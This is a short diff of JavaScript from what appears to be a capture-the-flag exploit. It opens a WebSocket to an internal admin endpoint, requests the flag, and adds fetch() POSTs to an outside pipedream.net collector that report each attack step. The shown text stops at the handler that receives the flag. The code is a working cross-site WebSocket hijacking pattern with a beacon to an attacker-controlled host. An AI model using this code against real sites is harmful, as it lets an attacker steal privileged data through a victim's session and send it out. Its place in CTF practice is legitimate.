@@ -15,10 +15,22 @@
 
         // WebSocket connection to retrieve flag
         const ws = new WebSocket('ws://web:8080/admin/ws');
-
+        
+        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: "After creating WS" })
+        });
+        
         ws.onopen = () => {
             ws.send('flag');  // Request the flag
         };
+
+        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: "After sending flag re" })
+        });
 
         ws.onmessage = (event) => {
             const flag = event.data;
